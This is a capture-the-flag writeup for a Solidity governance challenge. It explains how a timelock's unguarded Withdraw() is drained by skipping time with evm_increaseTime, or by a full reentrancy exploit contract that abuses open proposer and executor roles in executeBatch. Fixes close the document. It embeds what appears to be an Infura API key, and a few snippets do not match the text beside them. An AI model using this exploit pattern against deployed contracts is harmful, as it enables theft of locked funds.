- [Smart Contract CTF Writeup](#smart-contract-ctf-writeup)
  - [1. Source Code Analysis](#1-source-code-analysis)
    - [1.1 Setup.sol](#11-setupsol)
    - [1.2 TimelockController.sol](#12-timelockcontrollersol)
    - [1.3 Governance.sol](#13-governancesol)
    - [1.4 ERC20.sol](#14-erc20sol)
  - [2. Time Manipulation (deprecated)](#2-time-manipulation-deprecated)
    - [2.1 Vulnerabilitiy Analysis](#21-vulnerabilitiy-analysis)
    - [2.2 Attack Flow](#22-attack-flow)
    - [2.3 Cast Exploitation](#23-cast-exploitation)
    - [2.4 Using Exploit Contract](#24-using-exploit-contract)
  - [3. Temporal Logic Exploit](#3-temporal-logic-exploit)
    - [3.1 Understanding DAO Governance System](#31-understanding-dao-governance-system)
    - [3.2 Vulnerability Analysis](#32-vulnerability-analysis)
      - [3.2.1 Missing Access Control](#321-missing-access-control)
      - [3.2.2 EXECUTOR\_ROLE Open to Everyone](#322-executor_role-open-to-everyone)
      - [3.2.3 Temporal Logic in executeBatch](#323-temporal-logic-in-executebatch)
    - [3.3 Attack Flow](#33-attack-flow)
    - [3.4 Exploit Contract Implementation](#34-exploit-contract-implementation)
  - [4. Prevention Measures](#4-prevention-measures)
    - [4.1 Add Access Control](#41-add-access-control)
    - [4.2 Use Governance for All Operations](#42-use-governance-for-all-operations)


# Smart Contract CTF Writeup

## 1. Source Code Analysis
This challenge provides several source code files including `Setup.sol`, `TimelockController.sol`, `Governance.sol` and `ERC20.sol`. The objective is to reduce the TimelockController contract's token balance to exactly 1.

### 1.1 Setup.sol
The Setup contract initializes the challenge environment:
- create a DeciGov ERC20 token
- Set up a Uniswap V2 liquidity pair (WETH/DeciGov)
- Deploy a TimelockController with a 2-day delay (`minDelay = 2 days`)
- Transfer 1337 DeciGov tokens to the TimelockController

**Win Condition**: the `isSolved()` function checks if the TimelockController's token balance equals exactly 1.

### 1.2 TimelockController.sol
The TimelockController is a standard timelock governance contract with:
- `Constructor`: Records startTime = block.timestamp at deployment
- `Withdraw()`: A critical function that transfers all tokens except 1
  - Protected only by `onlyAfterDelay` modifier
  - **No caller identity check** - anyone can call it after the delay
- `onlyAfterDelay`: Checks if `block.timestamp >= startTime + _minDelay`
  - Requires waiting 2 days from deployment

### 1.3 Governance.sol
The Governance contract manages proposals and voting:
- `addProposer()`: Has no access control. Anyone can grant themselves `PROPOSER_ROLE`
- `addExecutor()`: Requires admin role

To note: these functions are not needed for the attack due to the simpler vulnerability

### 1.4 ERC20.sol
Standard ERC20 implementation with an owner and mint function. Not relevant to the main vulnerability.

## 2. Time Manipulation (deprecated)

### 2.1 Vulnerabilitiy Analysis
The critical vulnerability lies in the `Withdraw()` function of TimelockController Contract. 
```sol
function Withdraw() external onlyAfterDelay{
    uint256 balance = DeciGov.balanceOf(address(this));
    DeciGov.transfer(msg.sender, balance-1);
}
```
This function allows:
- transfer all tokens except 1 to the caller
- Protected only by `onlyAfterDelay` modifier
  - **No caller identity check** - anyone can call it
  - **No role requirement** - doesn't check `PROPOSER_ROLE` or `EXECUTOR_ROLE`
  - **No governance process** - doesn't require proposals or voting

The `onlyAfterDelay` modifier only checks:
- `startTime`: Set to block.timestamp during deployment
- `_minDelay`: Set to 2 days (172800 seconds)
- Condition: Current time must be >= deployment time + 2 days
```sol
modifier onlyAfterDelay() {
    require(block.timestamp >= startTime + _minDelay, "Delay not yet passed");
    _;
}
```

**The Problem**: In a production environment, this would require waiting 2 days. However, the CTF RPC node supports the `evm_increaseTime` method, which is a testing-only RPC call that allows:
- instantly advancing the blockchain's timestamp
- skipping the 2-day waiting period
- making time-locked functions immediately accessible

### 2.2 Attack Flow
The attack is simple:
1. Fast-forward time by 2 days using `evm_increaseTime(172800)`
2. Mine a new block using `evm_mine` to apply the time change
3. Call `Withdraw()` - the time check passes, and anyone can call it
4. Success - TimelockController balance becomes 1

No need for:
- Airdrop tokens
- Becoming a proposer
- Becoming an executor
- Creating proposals
- Voting
- Complex exploit contracts

### 2.3 Cast Exploitation
**Given Information**
1. Private Key (attacker's account)
2. Setup Address (entry point contract)
3. RPC URL (blockchain node endpoint)

Using Foundry's cast tool to execute all steps without deploying a custom attack contract is simpler and less error-prone.

1. Setup environment variables:
    ```bash
    export RPC_URL=XX
    export PRIVATE_KEY=YY
    export SETUP_ADDRESS=ZZ
    ```
2. Get contract address:
    ```bash
    TIMELOCK=$(cast call $SETUP "timelock()(address)" --rpc-url $RPC_URL)
    ```
3. Fast forward time:
    ```bash
    # Increase time by 2 days (172800 seconds)
    cast rpc evm_increaseTime 172800 --rpc-url $RPC_URL

    # Mine a new block to apply the time change
    cast rpc evm_mine --rpc-url $RPC_URL
    ```
4. Call Withdraw
    ```bash
    cast send $TIMELOCK "Withdraw()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL --gas-limit 200000
    ```
5. Verify success
    ```bash
    cast call $SETUP_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
    ```

### 2.4 Using Exploit Contract
Alternatively, an attack contract can be used to exploit the challenge.
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISetup {
    function timelock() external view returns (address);
    function isSolved() external view returns (bool);
}

interface ITimelock {
    function Withdraw() external;
}

contract Exploit {
    ISetup public setup;
    ITimelock public timelock;
    
    constructor(address _setup) {
        setup = ISetup(_setup);
        timelock = ITimelock(setup.timelock());
    }
    
    function attack() external {
        // Simply call Withdraw
        // Prerequisite: evm_increaseTime must have been called via RPC
        timelock.Withdraw();
        
        // Verify success
        require(setup.isSolved(), "Attack failed");
    }
}
```

Alternatively, time manipulation can also be done using curl to call RPC method.
```bash
# Fast-forward time
curl -X POST $RPC_URL \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "evm_increaseTime",
    "params": [172800],
    "id": 1
  }'

# Mine new block
curl -X POST $RPC_URL \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "evm_mine",
    "params": [],
    "id": 2
  }'
```

## 3. Temporal Logic Exploit
While the time manipulation method works in the CTF environment, there are temporal logic flaws that can be exploited without requiring `evm_increaseTime`.

### 3.1 Understanding DAO Governance System
A Decentralized Autonomous Organization (DAO) governance system is similar to a corporate board voting mechanism, but implemented entirely in smart contracts: a company with funds (1337 tokens) locked in a secure vault (TimelockContoller Contract).
| Componenet | Corporate | Purpose |
| --- | --- | --- |
| Governance Contract | Board of directors | Manage proposals and voting |
| TimelockController | Secure vault + time delay | hold funds with delayed execution |
| Proposal | board motion | "we propose to do ..." |
| Vote | board vote | members vote on proposals |
| Execute | execute decision | carry out approved proposals |
| Timelock delay | safety period | wait 2 days before execution |

**Normal Governance Workflow** works as follows:
1. Anyone create a proposal (`Governance.createProposal()`)
   - check if the proposer hold any governance tokens
   - create a new proposal(`id: proposalCount + 1`, `Proposer: msg.sender`, `Vote count: 0`, `Executed: false`) and emit the event
2. Token holders cast votes(`Governance.castVote()`)
   - check if voter hold any tokens
   - check proposal not already executed
   - check voter hasn't voted on this proposal before
   - record votes: votes (number of voters) + voteCount (weighted by tokens)
3. Execute proposal (`Governance.executeProposal()`)
   - verify sufficient vote weight > 31337
   - mark as executed
   - schedule operation (`Timelock.schedule()`), waiting for the safety period
4. Timelock delayed execution
   - anyone with EXECUTOR_ROLE calls execute operation (`timelock.execute()`)
   - timelock performs the actual token transfer

### 3.2 Vulnerability Analysis
The system contains multiple vulnerabilities that can be chained together to bypass the governance system and timelock.

#### 3.2.1 Missing Access Control
The `Withdraw()` function in TimelockController only has time-checking modifier `onlyAfterDelay`, BUT:
- no caller idetity check: anyone can call it
- no role requirement: doesn't check PROPOSER_ROLE or EXECUTOR_ROLE
- no governance process
```sol
function Withdraw() external onlyAfterDelay {
    uint256 balance = DeciGov.balanceOf(address(this));
    DeciGov.transfer(msg.sender, balance-1);
}
```

The `addProposer()` function in Governance has no access control:
- no caller idetity check: anyone can call it and become a PROPOSER
```sol
function addProposer(address account) public {
    timelockController.grantRole(PROPOSER_ROLE, account);
}
```

#### 3.2.2 EXECUTOR_ROLE Open to Everyone
The constructor in Setup grants zero address (`address(0)`) to EXECUTOR_ROLE, where the `address(0)` represents "anyone" or "public access".
```sol
constructor() payable {
    executor.push(address(0));  // Critical vulnerability
    timelock = new TimelockController(minDelay, proposer, executor, address(DeciGov));
}
```

Then in the TimelockController's constructor executes: `_setupRole(PROPOSER_ROLE, address(0));`, meaning that EXECUTOR_ROLE becomes "open to everyone".
```sol
constructor(uint256 minDelay, address[] memory proposers, address[] memory executors, address _DeciGov) {
  // ... inialization code ...
  for (uint256 i = 0; i < proposers.length; ++i) {
    _setupRole(PROPOSER_ROLE, proposers[i]);
    }
  }
```

The `onlyRoleOrOpenRole` modifier is implemented as follows:
- if `address(0)` doesn't have the role, then check if caller has it
- if `address(0)` has the role, skip the check
```sol
modifier onlyRoleOrOpenRole(bytes32 role) {
    if (!hasRole(role, address(0))) {
        _checkRole(role, _msgSender());
    }
    _;
}
```
Since `address(0)` is granted EXECUTOR_ROLE, EXECUTOR_ROLE becomes a "public role" and any address can call `execute()` and `executeBatch()`, completely bypassing authorization checks.

#### 3.2.3 Temporal Logic in executeBatch
The vulnerability exists in the TimelockController's `executeBatch()`.
```sol
    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt
    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {
        require(targets.length == values.length, "TimelockController: length mismatch");
        require(targets.length == datas.length, "TimelockController: length mismatch");

        bytes32 id = hashOperationBatch(targets, values, datas, predecessor, salt);
        _beforeCall(predecessor);
        for (uint256 i = 0; i < targets.length; ++i) {
            _call(id, i, targets[i], values[i], datas[i]);
        }
        _afterCall(id);
    }
```
This function makes external calls in a loop via `_call()`. The problem is that `_afterCall(id)` only marks the operation as done after all calls complete. In other words, the operation is still in "ready" state and the attacker can call back into the timelock during execution.

### 3.3 Attack Flow
1. Gain PROPOSER_ROLE, can schedule operations in the timelock
2. Prepare batch operations and schedule the batch
   - call `timelock.updateDelay(0)` 
   - call `exploit.callback()`
3. Schedule the patch, with "pending" status with 3 days delay (must be >= minDelay of 2 days)
4. Immediate execute the batch
   - first `_call()`: `timelock.updateDelay(0)`
     - set `_minDelay = 0`: caller is timelock itself (via executeBatch), passing the `require(msg.sender == address(this))` check
   - second `_call()`: exploit's `callback()`
     - `cancel(id)` original patch scheduling before it's marked as done
     - reschedule with delay = 0 (now possible because `_minDelay = 0`)
     - the new operation becomes immediately executable
5. Call `Withdraw()` to drain timelock

### 3.4 Exploit Contract Implementation
Deployment: using Hardhat (http://127.0.0.1:8545) + Remix (Dev - Hardhat Provider)
```bash
npm init -y
npm install --save-dev hardhat
npx hardhat node --fork https://mainnet.infura.io/v3/b6bf7d3508c941499b10025c0776eaf8
```

The complete exploit contract is shown below:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TimelockController.sol";
import "./Governance.sol";
import "./Setup.sol";

contract Attack {
    TimelockController public timelock; 
    Governance public governance;

    bytes32 public id;
    address[] public targets;
    uint256[] public values;
    bytes[] public datas;

    constructor(Setup setup) {
        timelock = setup.timelock();
        governance = setup.governance();
    }

    function attack() external {
        // Step 1: Exploit missing access control to become proposer
        governance.addProposer(address(this));

        // Step 2: Prepare batch operation
        targets.push(address(timelock));    // Target 1: timelock itself
        targets.push(address(this));        // Target 2: this attack contract

        values.push(0);  // No ETH transfer
        values.push(0);

        // Call 1: Make timelock set its own delay to 0
        datas.push(abi.encodeWithSelector(
            TimelockController.updateDelay.selector,
            0
        ));
        
        // Call 2: Trigger callback for reentrancy
        datas.push(abi.encodeWithSelector(this.callback.selector));
    
        // Step 3: Schedule with 3 days delay (required by initial minDelay)
        timelock.scheduleBatch(
            targets, 
            values, 
            datas, 
            bytes32(0),  // No predecessor
            bytes32(0),  // Salt = 0
            3 days       // Initial delay
        );
        
        // Calculate operation ID for later reference
        id = timelock.hashOperationBatch(targets, values, datas, bytes32(0), bytes32(0));
        
        // Step 4: Immediately execute (anyone can, due to address(0) executor)
        // This will:
        // - Call updateDelay(0), setting _minDelay = 0
        // - Call callback(), which will reenter and reschedule with delay=0
        timelock.executeBatch(targets, values, datas, bytes32(0), bytes32(0));

        // Step 5: Now Withdraw() passes because _minDelay = 0
        timelock.Withdraw();
        
        // Result: Timelock balance = 1, challenge solved!
    }

    // Step 4b: Reentrancy callback
    function callback() public {
        // At this point, _minDelay has been set to 0
        // Original operation is still "executing"
        
        // Cancel the operation that's currently executing
        timelock.cancel(id);
        
        // Reschedule the SAME operation with delay = 0
        // This is now allowed because _minDelay = 0
        timelock.scheduleBatch(
            targets, 
            values, 
            datas, 
            bytes32(0), 
            bytes32(0), 
            0  // Delay = 0, operation is immediately ready!
        );
    }
}
```

## 4. Prevention Measures
### 4.1 Add Access Control
The `Withdraw()` function should implement proper access control:
```sol
function Withdraw() external onlyAfterDelay onlyRole(EXECUTOR_ROLE) {
    uint256 balance = DeciGov.balanceOf(address(this));
    DeciGov.transfer(msg.sender, balance-1);
}
```

The `addProposer()` function should also have access control:
```sol
function addProposer(address account) public onlyAdmin {
    timelockController.grantRole(PROPOSER_ROLE, account);
}
```

### 4.2 Use Governance for All Operations
Critical operations like token transfers should require:
- Creating a proposal through the Governance contract
- Accumulating sufficient votes (> MIN_VOTE_COUNT)
- Executing through the standard timelock mechanism
